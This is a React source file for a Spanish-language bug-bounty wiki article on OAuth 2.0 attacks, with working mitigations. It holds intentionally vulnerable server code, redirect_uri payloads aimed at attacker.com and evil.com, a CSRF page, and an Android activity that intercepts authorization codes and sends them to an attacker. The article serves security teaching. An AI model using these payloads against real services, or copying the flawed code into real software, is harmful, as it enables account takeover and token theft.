/**
 * OAUTH ATTACKS
 * Explotar flujos OAuth mal implementados
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Key, Lock, Shield, AlertTriangle, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function OAuthAttacksContent({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduccion" title="OAuth 2.0 - El Protocolo Más Malinterpretado">
        <Paragraph>
          <Strong>OAuth 2.0</Strong> es un framework de autorización que permite a aplicaciones obtener 
          acceso limitado a recursos de usuario sin exponer contraseñas. Sin embargo, implementaciones 
          incorrectas pueden llevar a <Strong>account takeover</Strong>, robo de tokens y bypass de autorización.
        </Paragraph>

        <AlertDanger title="Ataques Comunes OAuth">
          <ul className="mt-2 space-y-1">
            <ListItem>🔓 Open Redirect en redirect_uri</ListItem>
            <ListItem>🎭 CSRF en OAuth flow</ListItem>
            <ListItem>🔐 Authorization code interception</ListItem>
            <ListItem>⏰ Replay de tokens sin validación</ListItem>
            <ListItem>🚪 State parameter bypass</ListItem>
            <ListItem>📧 Email scope abuse para account takeover</ListItem>
          </ul>
        </AlertDanger>
      </Section>

      <Section id="flujo-oauth" title="1. Flujo OAuth 2.0 Authorization Code">
        <CodeBlock
          language="text"
          title="Flujo normal de OAuth"
          code={`1. User → Client App: Click "Login with Google"

2. Client → Authorization Server (Google):
   GET https://accounts.google.com/o/oauth2/v2/auth?
     client_id=abc123
     &redirect_uri=https://client-app.com/callback
     &response_type=code
     &scope=email profile
     &state=random-csrf-token

3. User → Authorization Server: Login + Consent

4. Authorization Server → Client:
   302 Redirect to: https://client-app.com/callback?
     code=AUTH_CODE_HERE
     &state=random-csrf-token

5. Client → Authorization Server:
   POST https://oauth2.googleapis.com/token
   {
     "client_id": "abc123",
     "client_secret": "secret456",
     "code": "AUTH_CODE_HERE",
     "grant_type": "authorization_code",
     "redirect_uri": "https://client-app.com/callback"
   }

6. Authorization Server → Client:
   {
     "access_token": "ya29.xxx",
     "refresh_token": "1//xxx",
     "expires_in": 3600,
     "scope": "email profile"
   }

7. Client → Resource Server (Google API):
   GET https://www.googleapis.com/oauth2/v1/userinfo
   Authorization: Bearer ya29.xxx

8. Resource Server → Client:
   {
     "email": "user@gmail.com",
     "name": "John Doe",
     "id": "123456"
   }`}
        />
      </Section>

      <Section id="redirect-uri-manipulation" title="2. Redirect URI Manipulation">
        <Subsection title="Escenario Vulnerable">
          <CodeBlock
            language="javascript"
            title="❌ Validación insuficiente de redirect_uri"
            code={`// Authorization server vulnerable
app.get('/oauth/authorize', (req, res) => {
  const { client_id, redirect_uri, state } = req.query;
  
  // ❌ VULNERABLE - Solo valida que redirect_uri CONTENGA el dominio
  const client = db.clients.findOne({ id: client_id });
  
  if (redirect_uri.includes(client.redirect_uri)) {
    // Generar código y redirigir
    const code = generateAuthCode();
    res.redirect(\`\${redirect_uri}?code=\${code}&state=\${state}\`);
  }
});`}
          />
        </Subsection>

        <Subsection title="Ataque - Open Redirect">
          <CodeBlock
            language="text"
            title="Payload - Robo de authorization code"
            code={`# URL legítima esperada:
https://oauth-provider.com/authorize?
  client_id=abc123
  &redirect_uri=https://client-app.com/callback
  &response_type=code
  &state=xyz

# Payload malicioso:
https://oauth-provider.com/authorize?
  client_id=abc123
  &redirect_uri=https://client-app.com/callback@attacker.com
  &response_type=code
  &state=xyz

# O con subdirectorio:
&redirect_uri=https://client-app.com.evil.com/callback

# O con open redirect en client-app:
&redirect_uri=https://client-app.com/redirect?url=https://attacker.com`}
          />

          <AlertDanger>
            Si la validación solo verifica que el string contenga el dominio legítimo, 
            el atacante puede redirigir el <InlineCode>code</InlineCode> a su servidor 
            y completar el flujo para obtener el access token.
          </AlertDanger>
        </Subsection>
      </Section>

      <Section id="csrf-oauth" title="3. CSRF en OAuth Flow">
        <Paragraph>
          Si el <InlineCode>state</InlineCode> parameter no se valida correctamente, 
          un atacante puede vincular su cuenta OAuth a la cuenta de la víctima.
        </Paragraph>

        <CodeBlock
          language="javascript"
          title="❌ Código vulnerable sin validación de state"
          code={`// Client app callback vulnerable
app.get('/oauth/callback', async (req, res) => {
  const { code, state } = req.query;
  
  // ❌ VULNERABLE - No valida state parameter
  const tokens = await exchangeCodeForTokens(code);
  const userInfo = await getUserInfo(tokens.access_token);
  
  // Asociar cuenta OAuth con usuario actual
  req.session.user.oauthEmail = userInfo.email;
  
  res.redirect('/dashboard');
});`}
        />

        <Subsection title="Ataque - Account Linking CSRF">
          <CodeBlock
            language="html"
            title="Página maliciosa del atacante"
            code={`<!DOCTYPE html>
<html>
<body>
  <h1>Win a free iPhone!</h1>
  
  <script>
    // Atacante inicia flujo OAuth con SU cuenta
    window.location = 'https://oauth-provider.com/authorize?client_id=abc123&redirect_uri=https://client-app.com/callback&response_type=code&state=ignored';
  </script>
</body>
</html>

<!-- 
FLUJO DEL ATAQUE:
1. Víctima visita página del atacante
2. Redirigida a OAuth provider
3. Authorization code generado para cuenta del ATACANTE
4. Code enviado a client-app/callback
5. Client app NO valida state
6. Cuenta del atacante se VINCULA a sesión de la víctima
7. Atacante puede ahora acceder a cuenta de la víctima
-->`}
          />

          <AlertWarning>
            Resultado: La cuenta OAuth del atacante queda vinculada al perfil de la víctima. 
            Atacante puede iniciar sesión y acceder a todos los datos de la víctima.
          </AlertWarning>
        </Subsection>
      </Section>

      <Section id="authorization-code-interception" title="4. Authorization Code Interception">
        <CodeBlock
          language="javascript"
          title="❌ Mobile app vulnerable sin PKCE"
          code={`// Mobile app SIN PKCE (Proof Key for Code Exchange)
const initiateOAuth = () => {
  const authUrl = \`https://oauth-provider.com/authorize?
    client_id=mobile-app-123
    &redirect_uri=myapp://callback
    &response_type=code
    &scope=email\`;
  
  // Abrir browser
  openBrowser(authUrl);
};

// ❌ VULNERABLE - Code puede ser interceptado
const handleCallback = async (url) => {
  const code = extractCodeFromUrl(url);
  
  // Intercambiar code por token
  const tokens = await fetch('https://oauth-provider.com/token', {
    method: 'POST',
    body: JSON.stringify({
      client_id: 'mobile-app-123',
      client_secret: '', // ← Mobile apps NO pueden tener secretos seguros
      code: code,
      grant_type: 'authorization_code'
    })
  });
};`}
        />

        <Subsection title="Ataque - Malicious App Intercepts Code">
          <CodeBlock
            language="kotlin"
            title="App maliciosa registra mismo URL scheme"
            code={`// Malicious app AndroidManifest.xml
<activity android:name=".MaliciousActivity">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        
        <!-- Mismo scheme que app legítima -->
        <data android:scheme="myapp" android:host="callback" />
    </intent-filter>
</activity>

// Malicious activity
class MaliciousActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Interceptar authorization code
        val data = intent.data
        val code = data?.getQueryParameter("code")
        
        // Enviar code a servidor del atacante
        sendToAttacker(code)
        
        // Opcionalmente: forward a app legítima
        forwardToLegitimateApp(data)
    }
}`}
          />
        </Subsection>
      </Section>

      <Section id="scope-abuse" title="5. Scope Abuse - Email Hijacking">
        <CodeBlock
          language="javascript"
          title="Flujo vulnerable que confía en email del OAuth"
          code={`// Sign up/Login con OAuth
app.get('/oauth/callback', async (req, res) => {
  const tokens = await exchangeCodeForTokens(req.query.code);
  const userInfo = await getUserInfo(tokens.access_token);
  
  // ❌ VULNERABLE - Confía ciegamente en email del OAuth provider
  let user = await db.users.findOne({ email: userInfo.email });
  
  if (!user) {
    // Crear nueva cuenta automáticamente
    user = await db.users.create({
      email: userInfo.email,
      name: userInfo.name,
      oauthProvider: 'google'
    });
  }
  
  // Login automático
  req.session.userId = user.id;
  res.redirect('/dashboard');
});`}
        />

        <Subsection title="Ataque - Account Takeover via OAuth Email">
          <CodeBlock
            language="text"
            title="Escenario del ataque"
            code={`SETUP:
1. Víctima tiene cuenta: victim@gmail.com
2. Víctima NO ha vinculado OAuth (solo password)

ATAQUE:
1. Atacante crea cuenta en OAuth provider diferente con email: victim@gmail.com
   (En providers que NO verifican email, como algunos OIDC self-hosted)

2. Atacante inicia flujo OAuth en app vulnerable

3. App recibe userInfo.email = "victim@gmail.com"

4. App encuentra cuenta existente de la víctima

5. App hace LOGIN AUTOMÁTICO en cuenta de la víctima

6. ✓ Account Takeover completo sin password`}
          />

          <AlertDanger title="Mitigación">
            <Strong>NUNCA</Strong> confiar automáticamente en el email del OAuth provider. 
            Verificar que el email esté confirmado (<InlineCode>email_verified: true</InlineCode>) 
            y usar <InlineCode>sub</InlineCode> (subject ID) como identificador único.
          </AlertDanger>
        </Subsection>
      </Section>

      <Section id="token-replay" title="6. Token Replay Attacks">
        <CodeBlock
          language="javascript"
          title="❌ API sin validación de audience"
          code={`// API Resource Server vulnerable
app.get('/api/user/profile', async (req, res) => {
  const token = req.headers.authorization?.split('Bearer ')[1];
  
  // ❌ VULNERABLE - Solo valida firma, no audience
  const decoded = jwt.verify(token, PUBLIC_KEY);
  
  const user = await db.users.findById(decoded.sub);
  res.json(user);
});`}
        />

        <Subsection title="Ataque - Cross-Service Token Replay">
          <CodeBlock
            language="text"
            title="Exploit"
            code={`ESCENARIO:
- App A: https://app-a.com (photo sharing)
- App B: https://app-b.com (banking app)
- Ambas usan mismo OAuth provider

ATAQUE:
1. Atacante obtiene access token legítimo de App A
2. Token tiene scope: "email profile"
3. Atacante REUTILIZA token en API de App B
4. App B NO valida que token fue emitido para App B
5. App B acepta token y retorna datos sensibles

TOKEN LEGÍTIMO DE APP A:
{
  "iss": "https://oauth-provider.com",
  "sub": "user123",
  "aud": "app-a-client-id",  ← Debería validarse
  "scope": "email profile",
  "exp": 1735689600
}

REPLAY EN APP B:
GET https://app-b.com/api/account/balance
Authorization: Bearer <token-de-app-a>

# Si App B no valida 'aud', acepta el token ✓`}
          />
        </Subsection>
      </Section>

      <Section id="implicit-flow" title="7. Implicit Flow Vulnerabilities">
        <AlertWarning>
          El <Strong>Implicit Flow</Strong> está <Strong>DEPRECADO</Strong> y NO debe usarse. 
          Sin embargo, muchas apps antiguas aún lo usan.
        </AlertWarning>

        <CodeBlock
          language="text"
          title="Implicit flow - Token en URL fragment"
          code={`# Authorization request
GET https://oauth-provider.com/authorize?
  client_id=abc123
  &redirect_uri=https://client-app.com/callback
  &response_type=token          ← Token directo (NO code)
  &scope=email

# Response - Token en URL FRAGMENT
302 Redirect to:
https://client-app.com/callback#
  access_token=ya29.xxx
  &token_type=Bearer
  &expires_in=3600
  &scope=email

# ❌ PROBLEMAS:
1. Token expuesto en browser history
2. Token en Referer header si se navega a otra página
3. No hay client authentication
4. No hay refresh token
5. Token puede ser interceptado por JavaScript malicioso`}
        />
      </Section>

      <Section id="mitigacion" title="Mitigación Completa">
        <AlertDanger title="✅ Implementación Segura de OAuth">
          Seguir especificaciones RFC y mejores prácticas actualizadas.
        </AlertDanger>

        <Subsection title="1. Validación Estricta de redirect_uri">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Exact match de redirect_uri"
            code={`// Authorization server seguro
app.get('/oauth/authorize', (req, res) => {
  const { client_id, redirect_uri, state } = req.query;
  
  const client = db.clients.findOne({ id: client_id });
  
  // ✅ SEGURO - Exact match (no includes, no regex)
  const allowedUris = client.redirect_uris; // Array de URIs exactas
  
  if (!allowedUris.includes(redirect_uri)) {
    return res.status(400).json({ 
      error: 'invalid_request',
      error_description: 'redirect_uri not registered' 
    });
  }
  
  // ✅ Validar state presente
  if (!state || state.length < 16) {
    return res.status(400).json({ 
      error: 'invalid_request',
      error_description: 'state parameter required' 
    });
  }
  
  // Continuar flujo seguro
  const code = generateAuthCode({ client_id, redirect_uri, state });
  res.redirect(\`\${redirect_uri}?code=\${code}&state=\${state}\`);
});`}
          />
        </Subsection>

        <Subsection title="2. Implementar PKCE (Proof Key for Code Exchange)">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - PKCE para mobile/SPA"
            code={`// CLIENT: Generar PKCE challenge
const generatePKCE = () => {
  // 1. Generar code_verifier (random string)
  const codeVerifier = base64UrlEncode(crypto.randomBytes(32));
  
  // 2. Generar code_challenge (SHA256 hash)
  const codeChallenge = base64UrlEncode(
    crypto.createHash('sha256')
      .update(codeVerifier)
      .digest()
  );
  
  return { codeVerifier, codeChallenge };
};

// CLIENT: Authorization request con PKCE
const { codeVerifier, codeChallenge } = generatePKCE();
localStorage.setItem('pkce_verifier', codeVerifier);

const authUrl = \`https://oauth-provider.com/authorize?
  client_id=mobile-app-123
  &redirect_uri=myapp://callback
  &response_type=code
  &code_challenge=\${codeChallenge}
  &code_challenge_method=S256
  &state=\${state}\`;

// CLIENT: Token exchange con PKCE
const codeVerifier = localStorage.getItem('pkce_verifier');

const tokens = await fetch('https://oauth-provider.com/token', {
  method: 'POST',
  body: JSON.stringify({
    client_id: 'mobile-app-123',
    code: authCode,
    code_verifier: codeVerifier,  // ← PKCE verifier
    grant_type: 'authorization_code',
    redirect_uri: 'myapp://callback'
  })
});

// SERVER: Validar PKCE
app.post('/token', (req, res) => {
  const { code, code_verifier } = req.body;
  
  // Obtener code_challenge guardado al generar el code
  const storedChallenge = db.authCodes.findOne({ code }).code_challenge;
  
  // ✅ Validar que SHA256(verifier) == challenge
  const computedChallenge = base64UrlEncode(
    crypto.createHash('sha256').update(code_verifier).digest()
  );
  
  if (computedChallenge !== storedChallenge) {
    return res.status(400).json({ error: 'invalid_grant' });
  }
  
  // Continuar con token generation
});`}
          />
        </Subsection>

        <Subsection title="3. Validar State Parameter Correctamente">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - State validation con session"
            code={`// CLIENT: Generar y guardar state
app.get('/oauth/login', (req, res) => {
  const state = crypto.randomBytes(16).toString('hex');
  
  // ✅ Guardar en sesión del servidor (NO localStorage)
  req.session.oauthState = state;
  req.session.oauthInitiatedAt = Date.now();
  
  const authUrl = \`https://oauth-provider.com/authorize?
    client_id=abc123
    &redirect_uri=https://client-app.com/callback
    &response_type=code
    &state=\${state}\`;
  
  res.redirect(authUrl);
});

// CLIENT: Validar state en callback
app.get('/oauth/callback', async (req, res) => {
  const { code, state } = req.query;
  
  // ✅ Validar state match
  if (state !== req.session.oauthState) {
    return res.status(403).json({ error: 'State mismatch - CSRF detected' });
  }
  
  // ✅ Validar no expirado (5 minutos max)
  const elapsed = Date.now() - req.session.oauthInitiatedAt;
  if (elapsed > 5 * 60 * 1000) {
    return res.status(403).json({ error: 'OAuth flow expired' });
  }
  
  // ✅ Limpiar state usado
  delete req.session.oauthState;
  delete req.session.oauthInitiatedAt;
  
  // Continuar con code exchange
  const tokens = await exchangeCodeForTokens(code);
  // ...
});`}
          />
        </Subsection>

        <Subsection title="4. Verificar email_verified y Usar sub">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Validación de email verificado"
            code={`app.get('/oauth/callback', async (req, res) => {
  const tokens = await exchangeCodeForTokens(req.query.code);
  const userInfo = await getUserInfo(tokens.access_token);
  
  // ✅ Verificar que email esté verificado
  if (!userInfo.email_verified) {
    return res.status(403).json({ 
      error: 'Email not verified by OAuth provider' 
    });
  }
  
  // ✅ Usar 'sub' (subject ID) como identificador único
  let user = await db.users.findOne({ 
    oauthProvider: 'google',
    oauthSub: userInfo.sub  // ← NO usar email
  });
  
  if (!user) {
    // Primera vez con este OAuth account
    // Verificar si email ya existe en cuenta tradicional
    const existingUser = await db.users.findOne({ 
      email: userInfo.email 
    });
    
    if (existingUser && !existingUser.oauthSub) {
      // Requiere confirmación manual para vincular
      return res.render('link-oauth-account', {
        existingEmail: userInfo.email,
        oauthData: userInfo
      });
    }
    
    // Crear nueva cuenta
    user = await db.users.create({
      email: userInfo.email,
      name: userInfo.name,
      oauthProvider: 'google',
      oauthSub: userInfo.sub,
      emailVerified: true
    });
  }
  
  req.session.userId = user.id;
  res.redirect('/dashboard');
});`}
          />
        </Subsection>

        <Subsection title="5. Validar Audience en Resource Server">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Audience validation"
            code={`// API Resource Server
app.use(async (req, res, next) => {
  const token = req.headers.authorization?.split('Bearer ')[1];
  
  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }
  
  try {
    const decoded = jwt.verify(token, PUBLIC_KEY, {
      algorithms: ['RS256'],
      issuer: 'https://oauth-provider.com',
      audience: 'my-api-client-id'  // ✅ Validar audience
    });
    
    // ✅ Validar scope requerido
    const requiredScope = 'read:profile';
    if (!decoded.scope.includes(requiredScope)) {
      return res.status(403).json({ error: 'Insufficient scope' });
    }
    
    req.user = decoded;
    next();
    
  } catch (err) {
    return res.status(401).json({ error: 'Invalid token' });
  }
});`}
          />
        </Subsection>

        <Subsection title="6. Usar Authorization Code Flow (NO Implicit)">
          <AlertTip>
            <Strong>Siempre usar Authorization Code Flow con PKCE.</Strong> El Implicit Flow 
            está deprecado y tiene vulnerabilidades inherentes. Incluso para SPAs, usar 
            Authorization Code + PKCE.
          </AlertTip>
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente: SAML Attacks</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/saml-attacks`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Explotar implementaciones SAML inseguras</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
